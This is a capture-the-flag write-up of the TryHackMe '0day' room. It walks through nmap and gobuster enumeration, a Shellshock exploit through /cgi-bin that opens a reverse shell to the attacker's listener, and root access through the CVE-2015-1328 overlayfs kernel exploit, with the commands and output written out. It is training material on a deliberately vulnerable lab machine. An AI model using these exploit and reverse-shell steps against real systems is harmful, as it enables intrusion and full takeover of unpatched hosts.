<p align="center">
  THM : 0day<br>
  Difficulty : Medium<br>
  <img src="https://i.imgur.com/qHiusWi.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Exploiting Shellshock](#exploiting-shellshock)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Fist, let's start a agressive [nmap](https://nmap.org/) scan against the target :  
```
attacker@AttackBox:~/Documents/THM/CTF/0day$ nmap 10.10.20.40 -A -p- -oN nmapResults.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-22 18:48 CEST
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 14.19% done; ETC: 18:48 (0:00:24 remaining)
Nmap scan report for 10.10.20.40
Host is up (0.081s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.72 seconds
```

- SSH port is open (port 22), and the service running on this port is outdated (OpenSSH 6.6.1).
- HTTP port is open (port 80), there is a webserver running on the target. This service is also outdated (Apache 2.4.7).

## Website enumeration

### Summary

- [Gobuster enumeration](#gobuster-enumeration)
- [Manual enumeration](#manual-enumeration)

### Gobuster enumeration

First, let's run a [Gobuster](https://github.com/OJ/gobuster) scan to find interesting directories and files on the website :  
```
attacker@AttackBox:~/Documents/THM/CTF/0day$ gobuster dir -u http://10.10.20.40/ -w /opt/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.20.40/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2022/10/22 18:54:10 Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin              (Status: 301) [Size: 311] [--> http://10.10.20.40/cgi-bin/]
/img                  (Status: 301) [Size: 307] [--> http://10.10.20.40/img/]
/uploads              (Status: 301) [Size: 311] [--> http://10.10.20.40/uploads/]
/admin                (Status: 301) [Size: 309] [--> http://10.10.20.40/admin/]
/css                  (Status: 301) [Size: 307] [--> http://10.10.20.40/css/]
/js                   (Status: 301) [Size: 306] [--> http://10.10.20.40/js/]
/backup               (Status: 301) [Size: 310] [--> http://10.10.20.40/backup/]
/secret               (Status: 301) [Size: 310] [--> http://10.10.20.40/secret/]
/server-status        (Status: 403) [Size: 291]
Progress: 220432 / 220561 (99.94%)
===============================================================
2022/10/22 19:07:22 Finished
===============================================================
```

### Manual enumeration

By looking at `http://[TARGET_IP]/backup/`, we can find an SSH private key :  
![](https://i.imgur.com/QYVXaZg.jpg)  

There is nothing else that may be useful on the website, except the `/cgi-bin/` directory. The CGI (Common Gateway Interface) defines a way for a web server to 
interact with external content-generating programs, which are often referred to as CGI programs or CGI scripts. So the `/cgi-bin/` directory is used to store CGI scripts 
or programs.

## Exploiting Shellshock

Since the installed Apache version is outdated, I searched for known exploit that may work on the target (Apache 2.4.7). I found a vulnerability named "Shellshock". You can find a 
documentation that explains this vulnerability [here](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf). There is also an exploit available on [Exploit-DB](https://www.exploit-db.com/exploits/34900).

What is "Shellshock" :  
Shellshock is a vulnerability that cause a RCE (Remote Command Execution) on the target in [Bash](https://en.wikipedia.org/wiki/Bash_(Unix_shell)). From the documentation given by the OWASP : The vulnerability 
relies in the fact that BASH incorrectly executes trailing commands when it imports a function definition stored into an environment variable.  

Now that we found a vulnerability on the target, and we have downloaded the exploit from [Exploit-DB](https://www.exploit-db.com/exploits/34900), we can use it against the target :  
```
attacker@AttackBox:~/Documents/THM/CTF/0day$ python2 exploit.py payload=reverse rhost=10.10.4.147 lhost=10.14.32.60 lport=4242
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-sys/entropysearch.cgi
[*] 404 on : /cgi-sys/entropysearch.cgi
[-] Trying exploit on : /cgi-sys/defaultwebpage.cgi
[*] 404 on : /cgi-sys/defaultwebpage.cgi
[-] Trying exploit on : /cgi-mod/index.cgi
[*] 404 on : /cgi-mod/index.cgi
[-] Trying exploit on : /cgi-bin/test.cgi
[!] Successfully exploited
[!] Incoming connection from 10.10.4.147
10.10.4.147> whoami
www-data

10.10.4.147>
```

We have now a shell as `www-data` ! We can get the user.txt flag in `/home/ryan/user.txt` file.

## Privilege escalation

First, I will spawn another reverse shell using netcat and then I will stabilize it because the shell we have using the exploit is not the most convenient :  
```
attacker@AttackBox:~/Documents/THM/CTF/0day$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.4.147] 40548
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/home/ryan$ export TERM=xterm
export TERM=xterm
www-data@ubuntu:/home/ryan$
```

Now I just have to fully stabilize it by pressing CTRL+Z to background the reverse shell, then I use `stty -echo raw;fg`, and I have a fully stabilized shell.  

By doing simple enumeration, we have useful informations like the OS version and the kernel version :  
```
www-data@ubuntu:/home/ryan$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
www-data@ubuntu:/home/ryan$ cat /etc/issue
Ubuntu 14.04.1 LTS \n \l

www-data@ubuntu:/home/ryan$
```

- Ubuntu 14.04.1 LTS (Outdated)
- Linux kernel 3.13.0-32-generic (Outdated)

Since the kernel and the OS version are very outdated, we can search for exploits available on [Exploit-DB](https://www.exploit-db.com/).  
I found [this](https://www.exploit-db.com/exploits/37292) exploit that uses CVE-2015-1328.

What is CVE-2015-1328 ? From [nvd.nist.gouv](https://nvd.nist.gov/vuln/detail/CVE-2015-1328):
The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file 
creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an 
arbitrary mount namespace.

So I tried to compile this exploit but I had an error :  
```
www-data@ubuntu:/tmp$ ls
37292  f  linux-exploit-suggester-2.pl
www-data@ubuntu:/tmp$ gcc 37292 -o ofs
gcc: fatal error: -fuse-linker-plugin, but liblto_plugin.so not found
compilation terminated.
```

GCC cannot find `liblto_plugin.so`. Let's see if this file exists on the system :  
```
www-data@ubuntu:/tmp$ find / -name "liblto_plugin.so" 2>/dev/null
/usr/lib/gcc/x86_64-linux-gnu/4.8/liblto_plugin.so
www-data@ubuntu:/tmp$
```

So the file `liblto_plugin.so` exists on the target... But GCC cannot find it. After some research, I found out that the `PATH` environment variable was missing. 
So I used `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin/:/sbin:/bin` :  
```
www-data@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/
www-data@ubuntu:/tmp$ gcc 37292 -o ofs
37292: file not recognized: File format not recognized
collect2: error: ld returned 1 exit status
```

Another error. This time I found out pretty quickly what was causing this error. It's because the file I try to compile doesn't have the `.c` extension. So let's 
rename it and try again :  
```
www-data@ubuntu:/tmp$ mv 37292 37292.c
www-data@ubuntu:/tmp$ gcc 37292.c -o ofs
www-data@ubuntu:/tmp$ ls
37292.c  f  linux-exploit-suggester-2.pl  ofs
www-data@ubuntu:/tmp$ 
```

The compilation worked ! Let's run the exploit now and see if it works :  
```
www-data@ubuntu:/tmp$ ./ofs 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
# 
```

We have a shell as root ! Let's get the root flag located in `/root/root.txt` file.

## Conclusion

So the SSH key we've found was useless. This room took me a long time to finish because of the compilation errors I had. It took me a long time to find out what was 
the problem. In this room, we see again that it can be dangerous to keep outdated softwares/services installed on a machine. There is some other exploits that should 
work for the privilege escalation but I did not try to use them. This room was very cool and I learned some new things. Thanks for this room and thanks for 
reading my write ups !

